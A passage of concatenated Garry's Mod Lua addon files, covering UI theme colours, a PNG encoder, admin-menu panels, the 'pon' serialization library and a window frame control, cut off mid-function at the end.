		slider_track = ColorAlpha(PRIMARY, 65),
		slider_hover = ColorAlpha(PRIMARY, 5),
		slider_pressed = ColorAlpha(PRIMARY, 30),

		on_sheet = Color(43, 43, 43, 200),
		on_sheet_hover = Color(200, 200, 200, 20),

		--=--
		query_box_bg = "#181818",
		query_box_cancel = Color(244, 67, 54, 30),
		query_box_cancel_text = "#f44336",
		--=--

		--=--
		menu = "#212121",

		menu_option = "#212121",
		menu_option_text = "#bdbdbd",
		menu_option_hover = "#3b3b3b",
		menu_option_hover_text = "#fefefe",

		menu_spacer = "#303030",
		--=--

		line = "#303030",

		--=--
		column_sheet = "#263238",
		column_sheet_bar = "#202020",

		column_sheet_tab = "#202020",
		column_sheet_tab_hover = "#2e2e2e",
		column_sheet_tab_active = "#383838",

		column_sheet_tab_icon = "#909090",
		column_sheet_tab_icon_hover = "#f0f0f0",
		column_sheet_tab_icon_active = "#34a1e0",
		--=--

		--=--
		collapse_category_header = "#272727",
		collapse_category_header_hover = "#2a2a2a",
		collapse_category_header_active = "#2e2e2e",

		collapse_category_header_text = "#aaaaaa",
		collapse_category_header_text_hover = "#dcdcdc",
		collapse_category_header_text_active = "#34A1E0",

		collapse_category_item = "#343434",
		collapse_category_item_hover = "#464646",
		collapse_category_item_active = "#535353",

		collapse_category_item_text = "#aaaaaa",
		collapse_category_item_text_hover = "#dcdcdc",
		collapse_category_item_text_active = "#ffffff",
		--=--
	})
end

do
	local PRIMARY = Color(65, 185, 255)

	local ON_PRIMARY = Color(220, 220, 220)

	sui.add_theme("Blur", {
		frame = Color(30, 30, 30, 220),
		frame_blur = true,

		title = Color(255, 255, 255),
		header = Color(60, 60, 60, 200),

		close = Color(200, 200, 200),
		close_hover = Color(255, 60, 60),
		close_press = Color(255, 255, 255, 30),

		button = ColorAlpha(PRIMARY, 130),
		button_text = ON_PRIMARY,
		button_hover = Color(0, 0, 0, 30),
		button_click = PRIMARY,
		button_disabled = Color(100, 100, 100),
		button_disabled_text = "#bdbdbd",

		button2_hover = ColorAlpha(PRIMARY, 5),
		button2_selected = ColorAlpha(PRIMARY, 15),

		scroll = Color(0, 0, 0, 100),
		scroll_grip = PRIMARY,

		scroll_panel = Color(255, 255, 255, 10),
		scroll_panel_outline = false,

		text_entry_bg = Color(0, 0, 0, 0),
		text_entry_bar_color = Color(200, 200, 200, 153),
		text_entry = Color(240, 240, 240, 221),
		text_entry_2 = Color(200, 200, 200, 153),
		text_entry_3 = PRIMARY,

		property_sheet_bg = Color(60, 60, 60, 200),
		property_sheet_tab = Color(150, 150, 150),
		property_sheet_tab_click = Color(255, 255, 255, 40),
		property_sheet_tab_active = PRIMARY,

		toggle_button = Color(244, 67, 54),
		toggle_button_switch = Color(230, 230, 230),

		toggle_button_active = PRIMARY,
		toggle_button_switch_active = Color(230, 230, 230),

		slider_knob = PRIMARY,
		slider_track = ColorAlpha(PRIMARY, 100),
		slider_hover = ColorAlpha(PRIMARY, 40),
		slider_pressed = ColorAlpha(PRIMARY, 70),

		on_sheet = Color(60, 60, 60, 180),
		on_sheet_hover = Color(30, 30, 30, 70),

		--=--
		query_box_bg = Color(0, 0, 0, 100),
		query_box_cancel = Color(244, 67, 54, 30),
		query_box_cancel_text = "#f44336",
		--=--
	})
end
--PATH addons/_adminmodules_menu/lua/sui/libs/png_encoder.lua:
local string = string
local table = table
local bit = bit

local char = string.char
local byte = string.byte

local insert = table.insert
local concat = table.concat

local bor = bit.bor
local bxor = bit.bxor
local band = bit.band
local bnot = bit.bnot
local lshift = bit.lshift
local rshift = bit.rshift

local ceil = math.ceil

local SIGNATURE = char(137, 80, 78, 71, 13, 10, 26, 10)

local crc_table = {}; do
	local n = 0
	while n < 256 do
		local c = n
		local k = 0
		while k < 8 do
			if band(c, 1) ~= 0 then
				c = bxor(0xedb88320, rshift(c, 1))
			else
				c = rshift(c, 1)
			end
			k = k + 1
		end
		crc_table[n + 1] = c
		n = n + 1
	end
end

local crc = function(buf)
	local c = 0xffffffff
	for i = 1, #buf do
		c = bxor(crc_table[band(bxor(c, byte(buf, i)), 0xff) + 1], rshift(c, 8))
	end
	return bxor(c, 0xffffffff)
end

local dword_as_string = function(dword)
	return char(
		rshift(band(dword, 0xff000000), 24),
		rshift(band(dword, 0x00ff0000), 16),
		rshift(band(dword, 0x0000ff00), 8),
		band(dword, 0x000000ff)
	)
end

local create_chunk = function(type, data, length)
	local CRC = crc(type .. data)
	return concat({
		dword_as_string(length or #data),
		type,
		data,
		dword_as_string(CRC)
	}, "", 1, 4)
end

local create_IHDR; do
	local ARGS = (
		-- bit depth
		char(8) ..
		-- color type: 6=truecolor with alpha
		char(6) ..
		-- compression method: 0=deflate, only allowed value
		char(0) ..
		-- filtering: 0=adaptive, only allowed value
		char(0) ..
		-- interlacing: 0=none
		char(0)
	)

	create_IHDR = function(w, h)
		return create_chunk("IHDR", concat({
			dword_as_string(w),
			dword_as_string(h),
			ARGS
		}, "", 1, 3), 13)
	end
end

local deflate_pack; do
	local BASE = 6552
	local NMAX = 5552
	local adler32 = function(str)
		local s1 = 1
		local s2 = 0
		local n = NMAX

		for i = 1, #str do
			s1 = s1 + byte(str, i)
			s2 = s2 + s1

			n = n - 1
			if n == 0 then
				s1 = s1 % BASE
				s2 = s2 % BASE
				n = NMAX
			end
		end

		s1 = s1 % BASE
		s2 = s2 % BASE

		return bor(lshift(s2, 16), s1)
	end

	local splitChunks = function(chunk, chunkSize)
		local len = ceil(#chunk / chunkSize)
		local ret = {}
		for i = 1, len do
			ret[i - 1] = chunk:sub(((i - 1) * chunkSize) + 1, chunkSize)
		end
		return ret
	end

	deflate_pack = function(str)
		local ret = {"\x78\x9c"}

		local chunks = splitChunks(str, 0xFFFF)
		local len = #chunks

		local i = 0
		while i < (len + 1) do
			local chunk = chunks[i]
			local chunk_n = #chunk

			insert(ret, i < len and "\x00" or "\x01")
			insert(ret, char(band(chunk_n, 0xff), band(rshift(chunk_n, 8), 0xff)))
			insert(ret, char(band(bnot(chunk_n), 0xff), band(rshift(bnot(chunk_n), 8), 0xff)))
			insert(ret, chunk)
			i = i + 1
		end

		local t = adler32(str)
		t = char(
			band(rshift(t, 24), 0xff),
			band(rshift(t, 16), 0xff),
			band(rshift(t, 8), 0xff),
			band(t, 0xff)
		)

		insert(ret, t)

		return concat(ret)
	end
end

local create_IDAT; do
	local slice = function(a, s, e)
		local ret, j = {}, 0
		for i = s, e - 1 do
			ret[j] = char(band(a[i] or 0, 0xFF))
			j = j + 1
		end
		return ret
	end

	local array_split_chunks = function(w, h, array, chunkSize)
		local ret = {}
		local i = 0
		local len = ceil((w * h * 4 + 4) / chunkSize)
		while i < len do
			ret[i] = slice(array, i * chunkSize, (i + 1) * chunkSize)
			i = i + 1
		end
		return ret
	end

	create_IDAT = function(w, h, chunk)
		local scanlines = array_split_chunks(w, h, chunk, w * 4)

		local image_bytes = {}
		for i = 0, #scanlines do
			local scanline = scanlines[i]
			insert(image_bytes, char(band(0, 0xFF)))
			insert(image_bytes, concat(scanline, "", 0, #scanline))
		end
		image_bytes = deflate_pack(concat(image_bytes))

		return create_chunk("IDAT", image_bytes)
	end
end

local IEND = create_chunk("IEND", "", 0)
local to_return = {SIGNATURE, nil, nil, IEND}
local generate_png = function(w, h, chunk)
	local IHDR = create_IHDR(w, h)
	local IDAT = create_IDAT(w, h, chunk)

	to_return[2] = IHDR
	to_return[3] = IDAT

	return concat(to_return, "", 1, 4)
end

return generate_png
--PATH addons/_adminmodules_menu/lua/sui/vgui/sui_toggle_button.lua:
local Lerp = Lerp
local FrameTime = FrameTime

local SUI, NAME = CURRENT_SUI, CURRENT_SUI.name
local TDLib = sui.TDLib

local Panel = {}

sui.scaling_functions(Panel)

function Panel:Init()
	self:ScaleInit()

	local rounded_box = {}
	local switch_circle = {}
	function self:Paint(w, h)
		local is_checked = self:GetChecked()

		local _h = SUI.Scale(14)
		TDLib.RoundedBox(rounded_box, _h, 0, h / 2 - _h / 2, w, _h, is_checked and SUI.GetColor("toggle_button_active") or SUI.GetColor("toggle_button"))

		local size = h - 2
		do
			local pos = is_checked and (w - (size / 2)) or (h / 2 - 1)
			if self.pos then
				self.pos = Lerp(FrameTime() * 12, self.pos, pos)
			else
				self.pos = pos
			end
		end

		TDLib.DrawCircle(switch_circle, self.pos, h / 2, size / 2, is_checked and SUI.GetColor("toggle_button_switch_active") or SUI.GetColor("toggle_button_switch"))
	end

	self:SetSize(34, 20)
end

sui.register("ToggleButton", Panel, "DCheckBox")
--PATH addons/_adminmodules_menu/lua/sui/vgui/sui_zcolumn_sheet.lua:
local IsValid = IsValid

local TDLib_Classes = sui.TDLib.LibClasses
local SUI, NAME = CURRENT_SUI, CURRENT_SUI.name

local GetColor = SUI.GetColor

local Panel = {}

function Panel:Init()
	self.tabs = {}

	local tab_scroller = self:Add(NAME .. ".ScrollPanel")
	tab_scroller:Dock(LEFT)

	function tab_scroller:Paint(w, h)
		self:RoundedBox("Background", 1, 0, 0, w, h, GetColor("column_sheet_bar"))
	end

	self.tabs_wide = 48
	self.tab_scroller = tab_scroller

	self:ScaleChanged()
	SUI.OnScaleChanged(self, self.ScaleChanged)
end

function Panel:ScaleChanged()
	local tabs_wide = SUI.Scale(self.tabs_wide)
	self.tab_scroller:SetWide(tabs_wide)

	self:InvalidateLayout(true)

	local tabs = self.tabs
	for i = 1, #self.tabs do
		tabs[i].img:SetMinus(SUI.Scale(20))
	end
end

function Panel:Paint(w, h)
	self:RoundedBox("Background", 1, 0, 0, w, h, GetColor("column_sheet"))
end

local tab_DoClick = function(s)
	s.parent:SetActiveTab(s)
end

local tab_Paint = function(s, w, h)
	local cur_col
	if s.active then
		cur_col = GetColor("column_sheet_tab_active")
	elseif s.Hovered then
		cur_col = GetColor("column_sheet_tab_hover")
	else
		cur_col = GetColor("column_sheet_tab")
	end

	s:RoundedBox("Backgrounds", 0, 0, 0, w, h, cur_col)
end

local tab_OnRemove = function(s)
	table.RemoveByValue(s.parent.tabs, s)
end

function Panel:AddSheet(mat, load_func)
	local tab = self.tab_scroller:Add(NAME .. ".Button")
	tab:Dock(TOP)
	tab:SetText("")
	tab:SetTall(self.tabs_wide)

	tab.On = TDLib_Classes.On

	tab.DoClick = tab_DoClick
	tab.Paint = tab_Paint
	tab:On("OnRemove", tab_OnRemove)

	tab.parent = self
	tab.load_func = load_func

	local img = tab:Add(NAME .. ".Image")
	img:Dock(FILL)
	img:SetImage(mat)
	img:SetMinus(SUI.Scale(20))

	tab.img = img

	self.tab_scroller:AddItem(tab)

	if not self:GetActiveTab() then
		self:SetActiveTab(tab)
	end

	table.insert(self.tabs, tab)

	return tab
end

function Panel:GetActiveTab()
	return self.active_tab
end

function Panel:SetActiveTab(new_tab)
	if new_tab == self.active_tab then return end

	if not IsValid(new_tab.panel) then
		local panel = new_tab.load_func(self)
		panel:SetParent(self)
		panel:SetVisible(false)
		panel:SetAlpha(0)

		panel.tab = new_tab
		new_tab.panel = panel
	end

	local old_active_tab = self.active_tab
	local delay = 0
	if old_active_tab and IsValid(old_active_tab.panel) then
		old_active_tab.active = false
		delay = 0.2
		old_active_tab.panel:AlphaTo(0, delay, 0, function(_, p)
			if p:IsValid() then
				p:SetVisible(false)
			end
		end)
	end

	new_tab.active = true
	new_tab.panel:SetVisible(true)
	new_tab.panel:AlphaTo(255, 0.2, delay)
	self.active_tab = new_tab
end

sui.register("ColumnSheet", Panel, "EditablePanel")
--PATH addons/_adminmodules_menu/lua/sui/vgui/sam_player_line.lua:
local SUI, NAME = CURRENT_SUI, CURRENT_SUI.name

local TDLib = sui.TDLib
local draw_material = sui.draw_material
local lerp_color = sui.lerp_color

local GetColor = SUI.GetColor
local RoundedBox = TDLib.RoundedBox
local CircleAvatar = TDLib.LibClasses.CircleAvatar
local CircleClick2 = TDLib.LibClasses.CircleClick2

local PLAYER_LINE_NAME = SUI.CreateFont("PlayerLineName", "Roboto Bold", 17)
local PLAYER_LINE_RANK = SUI.CreateFont("PlayerLineRank", "Roboto Bold", 13)
local PLAYER_LINE_STEAMID = SUI.CreateFont("PlayerLineSteamID", "Roboto Medium", 12)

local PANEL = {}

function PANEL:Init()
	local size = SUI.Scale(34)

	self:Dock(TOP)
	self:SetTall(size)

	self.size = size
end

local rank_Paint = function(s, w, h)
	RoundedBox(s.rect, SUI.Scale(10), 0, 0, w, h, s.col)
end

function PANEL:SetInfo(info)
	local size = self.size

	local container
	do
		local w = SUI.Scale(280) + size

		local _container = self:Add("Panel")
		_container:Dock(LEFT)
		_container:SetMouseInputEnabled(false)
		_container:SetWide(w)

		container = _container:Add("Panel")
		container:SetSize(w, size)

		function _container:PerformLayout()
			container:Center()
		end
	end

	do
		local avatar = container:Add("Panel")
		avatar:Dock(LEFT)
		avatar:DockMargin(0, 0, 5, 0)
		avatar:SetWide(size)
		avatar:SetMouseInputEnabled(false)
		CircleAvatar(avatar)

		avatar:SetSteamID(util.SteamIDTo64(info.steamid), size)
	end

	do
		local top_container = container:Add("Panel")
		top_container:Dock(TOP)
		top_container:DockMargin(0, 0, 0, 2)

		local name = top_container:Add("SAM.Label")
		name:Dock(LEFT)
		name:SetFont(PLAYER_LINE_NAME)
		self.name = name

		local pname = info.name
		if not pname or pname == "" then
			name:SetTextColor(GetColor("player_list_names_2"))
			self:SetName("N/A")
		else
			name:SetTextColor(GetColor("player_list_names"))
			self:SetName(pname)
		end

		if info.rank then
			local rank_bg = top_container:Add("Panel")
			rank_bg:Dock(LEFT)
			rank_bg:DockMargin(5, 0, 0, 0)

			rank_bg.rect = {}
			rank_bg.col = info.rank_bg or GetColor("player_list_rank")
			rank_bg.Paint = rank_Paint

			local rank = rank_bg:Add("SAM.Label")
			rank:Dock(FILL)
			rank:DockMargin(SUI.Scale(8), 0, 0, 0)
			rank:SetTextColor(GetColor("player_list_rank_text"))
			rank:SetFont(PLAYER_LINE_RANK)
			rank.bg = rank_bg

			self.rank = rank
			self:SetRank(info.rank)

			rank_bg:SetSize(rank:GetTextSize() + SUI.Scale(8) * 2)
		end

		top_container:SizeToChildren(true, true)
	end

	local steamid = container:Add("SAM.Label")
	steamid:Dock(TOP)
	steamid:SetTextColor(GetColor("player_list_steamid"))
	steamid:SetFont(PLAYER_LINE_STEAMID)
	steamid:SetText(info.steamid)
	steamid:SizeToContents()
	steamid:SetAutoStretchVertical(true)

	self.container = container
end

function PANEL:SetName(new_name)
	local name =  self.name
	name:SetText(new_name)
	name:SizeToContents()
	if name:GetWide() > 160 then
		name:SetWide(158)
	end
end

function PANEL:SetRank(new_rank)
	local rank = self.rank
	rank:SetText(new_rank)
	rank:SizeToContents()
	rank.bg:SetSize(rank:GetTextSize() + SUI.Scale(8) * 2)
end

function PANEL:Actions()
	local container
		do
		local size = self.size

		local _container = self:Add("Panel")
		_container:Dock(RIGHT)
		_container:SetWide(size)

		container = _container:Add("Panel")
		container:SetSize(size, size)

		function _container:PerformLayout()
			container:Center()
		end
	end

	local actions_button = container:Add("SAM.Button")
	actions_button:SetText("")
	actions_button:ClearPaint()

	function container:PerformLayout(w, h)
		actions_button:SetSize(h, h)
		actions_button:Center()
	end

	local image = actions_button:Add("SAM.Image")
	image:Dock(FILL)
	image:SetImage("https://raw.githubusercontent.com/Srlion/Addons-Data/main/icons/sam/dots_verticle.png")

	local current_icon_color = Color(GetColor("actions_button_icon"):Unpack())
	function image:Draw(w, h)
		if not h then return end

		if actions_button.Hovered then
			lerp_color(current_icon_color, GetColor("actions_button_icon_hover"))
		else
			lerp_color(current_icon_color, GetColor("actions_button_icon"))
		end

		draw_material(nil, w / 2, h / 2, SUI.ScaleEven(20), current_icon_color)
	end

	CircleClick2(actions_button, Color(62, 62, 62), 10)
	actions_button:Center()

	return actions_button
end

sui.register("PlayerLine", PANEL, "Panel")
--PATH addons/plib_v5/lua/plib/libraries/pon.lua:
--[[

DEVELOPMENTAL VERSION;

VERSION 1.2.2
Copyright thelastpenguin™

	You may use this for any purpose as long as:
	-	You don't remove this copyright notice.
	-	You don't claim this to be your own.
	-	You properly credit the author, thelastpenguin™, if you publish your work based on (and/or using) this.

	If you modify the code for any purpose, the above still applies to the modified code.

	The author is not held responsible for any damages incured from the use of pon, you use it at your own risk.

DATA TYPES SUPPORTED:
 - tables  - 		k,v - pointers
 - strings - 		k,v - pointers
 - numbers -		k,v
 - booleans- 		k,v
 - Vectors - 		k,v
 - Angles  -		k,v
 - Entities- 		k,v
 - Players - 		k,v

CHANGE LOG
V 1.1.0
 - Added Vehicle, NPC, NextBot, Player, Weapon
V 1.2.0
 - Added custom handling for k,v tables without any array component.
V 1.2.1
 - fixed deserialization bug.

THANKS TO...
 - VERCAS for the inspiration.
]]


local pon = {};
_G.pon = pon;

local type, count = type, table.Count ;
local tonumber = tonumber ;
local format = string.format;
do
	local type, count = type, table.Count ;
	local tonumber = tonumber ;
	local format = string.format;

	local encode = {};

	local tryCache ;

	local cacheSize = 0;

	encode['table'] = function( self, tbl, output, cache )

		if( cache[ tbl ] )then
			output[ #output + 1 ] = format('(%x)',  cache[tbl] );
			return ;
		else
			cacheSize = cacheSize + 1;
			cache[ tbl ] = cacheSize;
		end


    local first = next(tbl, nil)
    local predictedNumeric = 1
    local lastKey = nil
    -- starts with a numeric dealio
    if first == 1 then
      output[#output + 1] = '{'

      for k,v in next, tbl do
        if k == predictedNumeric then
          predictedNumeric = predictedNumeric + 1

          local tv = type(v)
          if tv == 'string' then
            local pid = cache[v]
            if pid then
              output[#output + 1] = format('(%x)', pid)
            else
              cacheSize = cacheSize + 1
              cache[v] = cacheSize
              self.string(self, v, output, cache)
            end
          else
            self[tv](self, v, output, cache)
          end

        else
          break
        end
      end

			predictedNumeric = predictedNumeric - 1
    else
      predictedNumeric = nil
    end

    if predictedNumeric == nil then
      output[#output + 1] = '[' -- no array component
    else
      output[#output + 1] = '~' -- array component came first so shit needs to happen
    end

    for k, v in next, tbl, predictedNumeric do
      local tk, tv = type(k), type(v)

      -- WRITE KEY
      if tk == 'string' then
        local pid = cache[ k ];
        if( pid )then
          output[ #output + 1 ] = format('(%x)',  pid );
        else
          cacheSize = cacheSize + 1;
          cache[ k ] = cacheSize;

          self.string( self, k, output, cache );
        end
      else
        self[tk](self, k, output, cache)
      end

      -- WRITE VALUE
      if( tv == 'string' )then
        local pid = cache[ v ];
        if( pid )then
          output[ #output + 1 ] = format('(%x)',  pid );
        else
          cacheSize = cacheSize + 1;
          cache[ v ] = cacheSize;

          self.string( self, v, output, cache );
        end
      else
        self[ tv ]( self, v, output, cache );
      end
    end

    output[#output + 1] = '}'
	end
	--    ENCODE STRING
	local gsub = string.gsub ;
	encode['string'] = function( self, str, output )
		--if tryCache( str, output ) then return end
		local estr, count = gsub( str, ";", "\\;");
		if( count == 0 )then
			output[ #output + 1 ] = '\''..str..';';
		else
			output[ #output + 1 ] = '"'..estr..'";';
		end
	end
	--    ENCODE NUMBER
	encode['number'] = function( self, num, output )
		if num%1 == 0 then
			if num < 0 then
				output[ #output + 1 ] = format( 'x%x;', -num );
			else
				output[ #output + 1 ] = format('X%x;', num );
			end
		else
			output[ #output + 1 ] = tonumber( num )..';';
		end
	end
	--    ENCODE BOOLEAN
	encode['boolean'] = function( self, val, output )
		output[ #output + 1 ] = val and 't' or 'f'
	end
	--    ENCODE VECTOR
	encode['Vector'] = function( self, val, output )
		output[ #output + 1 ] = ('v'..val.x..','..val.y)..(','..val.z..';');
	end
	--    ENCODE ANGLE
	encode['Angle'] = function( self, val, output )
		output[ #output + 1 ] = ('a'..val.p..','..val.y)..(','..val.r..';');
	end
	encode['Entity'] = function( self, val, output )
		output[ #output + 1] = 'E'..(IsValid( val ) and (val:EntIndex( )..';') or '#');
	end
	encode['Player']  = encode['Entity'];
	encode['Vehicle'] = encode['Entity'];
	encode['Weapon']  = encode['Entity'];
	encode['NPC']     = encode['Entity'];
	encode['NextBot'] = encode['Entity'];
	encode['PhysObj'] = encode['Entity'];

	encode['nil'] = function()
		output[ #output + 1 ] = '?';
	end
	encode.__index = function( key )
		ErrorNoHalt('Type: '..key..' can not be encoded. Encoded as as pass-over value.');
		return encode['nil'];
	end

	do
		local empty, concat = table.Empty, table.concat ;
		function pon.encode( tbl )
			local output = {};
			cacheSize = 0;
			encode[ 'table' ]( encode, tbl, output, {} );
			local res = concat( output );

			return res;
		end
	end
end

do
	local tonumber = tonumber ;
	local find, sub, gsub, Explode = string.find, string.sub, string.gsub, string.Explode ;
	local Vector, Angle, Entity = Vector, Angle, Entity ;

	local decode = {};
	decode['{'] = function( self, index, str, cache )

		local cur = {};
		cache[ #cache + 1 ] = cur;

		local k, v, tk, tv = 1, nil, nil, nil;
		while( true )do
			tv = sub( str, index, index );
			if( not tv or tv == '~' )then
				index = index + 1;
				break ;
			end
			if( tv == '}' )then
				return index + 1, cur;
			end

			-- READ THE VALUE
			index = index + 1;
			index, v = self[ tv ]( self, index, str, cache );
			cur[ k ] = v;

			k = k + 1;
		end

		while( true )do
			tk = sub( str, index, index );
			if( not tk or tk == '}' )then
				index = index + 1;
				break ;
			end

			-- READ THE KEY

			index = index + 1;
			index, k = self[ tk ]( self, index, str, cache );

			-- READ THE VALUE
			tv = sub( str, index, index );
			index = index + 1;
			index, v = self[ tv ]( self, index, str, cache );

			cur[ k ] = v;
		end

		return index, cur;
	end
	decode['['] = function( self, index, str, cache )

		local cur = {};
		cache[ #cache + 1 ] = cur;

		local k, v, tk, tv = 1, nil, nil, nil;
		while( true )do
			tk = sub( str, index, index );
			if( not tk or tk == '}' )then
				index = index + 1;
				break ;
			end

			-- READ THE KEY
			index = index + 1;
			index, k = self[ tk ]( self, index, str, cache );
			if not k then continue end

			-- READ THE VALUE
			tv = sub( str, index, index );
			index = index + 1;
			if not self[tv] then
				print('did not find type: '..tv)
			end
			index, v = self[ tv ]( self, index, str, cache );

			cur[ k ] = v;
		end

		return index, cur;
	end

	-- STRING
	decode['"'] = function( self, index, str, cache )
		local finish = find( str, '";', index, true );
		local res = gsub( sub( str, index, finish - 1 ), '\\;', ';' );
		index = finish + 2;

		cache[ #cache + 1 ] = res;
		return index, res;
	end
	-- STRING NO ESCAPING NEEDED
	decode['\''] = function( self, index, str, cache )
		local finish = find( str, ';', index, true );
		local res = sub( str, index, finish - 1 )
		index = finish + 1;

		cache[ #cache + 1 ] = res;
		return index, res;
	end

	-- NUMBER
	decode['n'] = function( self, index, str, cache )
		index = index - 1;
		local finish = find( str, ';', index, true );
		local num = tonumber( sub( str, index, finish - 1 ) );
		index = finish + 1;
		return index, num;
	end
	decode['0'] = decode['n'];
	decode['1'] = decode['n'];
	decode['2'] = decode['n'];
	decode['3'] = decode['n'];
	decode['4'] = decode['n'];
	decode['5'] = decode['n'];
	decode['6'] = decode['n'];
	decode['7'] = decode['n'];
	decode['8'] = decode['n'];
	decode['9'] = decode['n'];
	decode['-'] = decode['n'];
	-- positive hex
	decode['X'] = function( self, index, str, cache )
		local finish = find( str, ';', index, true );
		local num = tonumber( sub( str, index, finish - 1), 16 );
		index = finish + 1;
		return index, num;
	end
	-- negative hex
	decode['x'] = function( self, index, str, cache )
		local finish = find( str, ';', index, true );
		local num = -tonumber( sub( str, index, finish - 1), 16 );
		index = finish + 1;
		return index, num;
	end

	-- POINTER
	decode['('] = function( self, index, str, cache )
		local finish = find( str, ')', index, true );
		local num = tonumber( sub( str, index, finish - 1), 16 );
		index = finish + 1;
		return index, cache[ num ];
	end

	-- BOOLEAN. ONE DATA TYPE FOR YES, ANOTHER FOR NO.
	decode[ 't' ] = function( self, index )
		return index, true;
	end
	decode[ 'f' ] = function( self, index )
		return index, false;
	end

	-- VECTOR
	decode[ 'v' ] = function( self, index, str, cache )
		local finish =  find( str, ';', index, true );
		local vecStr = sub( str, index, finish - 1 );
		index = finish + 1; -- update the index.
		local segs = Explode( ',', vecStr, false );
		return index, Vector( tonumber( segs[1] ), tonumber( segs[2] ), tonumber( segs[3] ) );
	end
	-- ANGLE
	decode[ 'a' ] = function( self, index, str, cache )
		local finish =  find( str, ';', index, true );
		local angStr = sub( str, index, finish - 1 );
		index = finish + 1; -- update the index.
		local segs = Explode( ',', angStr, false );
		return index, Angle( tonumber( segs[1] ), tonumber( segs[2] ), tonumber( segs[3] ) );
	end
	-- ENTITY
	decode[ 'E' ] = function( self, index, str, cache )
		if( str[index] == '#' )then
			index = index + 1;
			return index, NULL ;
		else
			local finish = find( str, ';', index, true );
			local num = tonumber( sub( str, index, finish - 1 ) );
			index = finish + 1;
			return index, Entity( num );
		end
	end
	-- PLAYER
	decode[ 'P' ] = function( self, index, str, cache )
		local finish = find( str, ';', index, true );
		local num = tonumber( sub( str, index, finish - 1 ) );
		index = finish + 1;
		return index, Entity( num ) or NULL;
	end
	-- NIL
	decode['?'] = function( self, index, str, cache )
		return index + 1, nil;
	end


	function pon.decode( data )
		local _, res = decode[sub(data,1,1)]( decode, 2, data, {});
		return res;
	end
end

--PATH addons/vapeswep/lua/autorun/sh_vapeswep.lua:
-- autorun/client/cl_vapeswep.lua
-- Defines shared globals for Vape SWEP

-- Vape SWEP by Swamp Onions - http://steamcommunity.com/id/swamponions/

CreateConVar("vape_block_sounds", "0", FCVAR_REPLICATED, "Set to 1 to disable Vape SWEP speech sounds")

--override Entity:SetMaterial to make sure vape shows for ponies
meta = FindMetaTable("Entity")
if meta.VapeOrigSetMaterial == nil then
	meta.VapeOrigSetMaterial = meta.SetMaterial
	meta.SetMaterial = function(self, materialName, forceMaterial)
		if self:GetClass():sub(1,11)=="weapon_vape" and materialName=="Models/effects/vol_light001" then return end
		self:VapeOrigSetMaterial(materialName, forceMaterial)
	end
end
--PATH addons/dermaf4/lua/ui/controls/frame.lua:
local PANEL = {}

AccessorFunc(PANEL, 'm_bIsMenuComponent', 		'IsMenu', 			FORCE_BOOL)
AccessorFunc(PANEL, 'm_bDraggable', 			'Draggable', 		FORCE_BOOL)
AccessorFunc(PANEL, 'm_bSizable', 				'Sizable', 			FORCE_BOOL)
AccessorFunc(PANEL, 'm_bScreenLock', 			'ScreenLock', 		FORCE_BOOL)
AccessorFunc(PANEL, 'm_bDeleteOnClose', 		'DeleteOnClose', 	FORCE_BOOL)
AccessorFunc(PANEL, 'm_bPaintShadow', 			'PaintShadow', 		FORCE_BOOL)

AccessorFunc(PANEL, 'm_iMinWidth', 				'MinWidth')
AccessorFunc(PANEL, 'm_iMinHeight', 			'MinHeight')

AccessorFunc(PANEL, 'm_bBackgroundBlur', 		'BackgroundBlur', 	FORCE_BOOL)

function PANEL:Init()
	self:SetFocusTopLevel(true)

	self.btnClose = ui.Create('DButton', self)
	self.btnClose:SetText('')
	self.btnClose.DoClick = function (button) self:Close() end
	self.btnClose.Paint = function(panel, w, h) derma.SkinHook('Paint', 'WindowCloseButton', panel, w, h) end

	self.lblTitle = ui.Create('DLabel', self)
	self.lblTitle:SetColor(ui.col.White)
	self.lblTitle:SetFont('ui.22')

	self:SetDraggable(true)
	self:SetSizable(false)
	self:SetScreenLock(false)
	self:SetDeleteOnClose(true)
	self:SetTitle('Window')
	self:SetSkin('SUP')

	self:SetMinWidth(50)
	self:SetMinHeight(50)

	-- This turns off the engine drawing
	self:SetPaintBackgroundEnabled(false)
	self:SetPaintBorderEnabled(false)

	self.m_fCreateTime = SysTime()

	self:DockPadding(5, 24 + 5, 5, 5)

	self:SetAlpha(0)
	self:FadeIn(0.2)

	hook('Think', self, function()
		if self.HandleMovement then
			self:HandleMovement()
		end
		if (self.Anim) then
			self.Anim:Run()
		end
	end)

	if (self.InitDerived) then self:InitDerived() end
end

function PANEL:Focus()
	local panels = {}
	self:SetBackgroundBlur(true)
	for k, v in ipairs(vgui.GetWorldPanel():GetChildren()) do
		if v:IsVisible() and (v ~= self) then
			panels[#panels + 1] = v
			v:SetVisible(false)
		end
	end
	self._OnClose = self.OnClose
	self.OnClose = function(self)
		for k, v in ipairs(panels) do
			if IsValid(v) then
				v:SetVisible(true)
			end
		end
		self:_OnClose()
	end
end

function PANEL:ShowCloseButton(bShow)
	self.btnClose:SetVisible(bShow)
end

function PANEL:SetTitle(strTitle)
	self.lblTitle:SetText(strTitle)
end

function PANEL:GetTitleHeight()
	return 35 -- 28 + 5px padding
end

function PANEL:GetDockPos()
	return 5, self:GetTitleHeight()
end

function PANEL:Center()
	self:InvalidateLayout(true)
	self:SetPos(ScrW()/2 - self:GetWide()/2, ScrH()/2 - self:GetTall()/2)
end

function PANEL:Close(cback)
	if (self:GetDeleteOnClose()) then
		self.Think = function() end -- You'll break shit if you continue to run
	end

	self:FadeOut(0.2, function()
		if (self:GetDeleteOnClose()) then
			self:Remove()
		else
			self:SetVisible(false)
		end

		if cback then cback() end
	end)

	self:OnClose()
end

function PANEL:OnClose()

end

function PANEL:Think()

end

function PANEL:IsActive()
	if (self:HasFocus()) then return true end
	if (vgui.FocusedHasParent(self)) then return true end

	return false
end

function PANEL:HandleMovement()
	local mousex = math.Clamp(gui.MouseX(), 1, ScrW()-1)
	local mousey = math.Clamp(gui.MouseY(), 1, ScrH()-1)

	if (self.Dragging) then

		local x = mousex - self.Dragging[1]
		local y = mousey - self.Dragging[2]

		-- Lock to screen bounds if screenlock is enabled
		if (self:GetScreenLock()) then

			x = math.Clamp(x, 0, ScrW() - self:GetWide())
			y = math.Clamp(y, 0, ScrH() - self:GetTall())

		end

		self:SetPos(x, y)

	end

	if (self.Sizing) then
		local x = mousex - self.Sizing[1]
		local y = mousey - self.Sizing[2]
		local px, py = self:GetPos()

		if (x < self.m_iMinWidth) then x = self.m_iMinWidth elseif (x > ScrW() - px and self:GetScreenLock()) then x = ScrW() - px end
		if (y < self.m_iMinHeight) then y = self.m_iMinHeight elseif (y > ScrH() - py and self:GetScreenLock()) then y = ScrH() - py end

		self:SetSize(x, y)
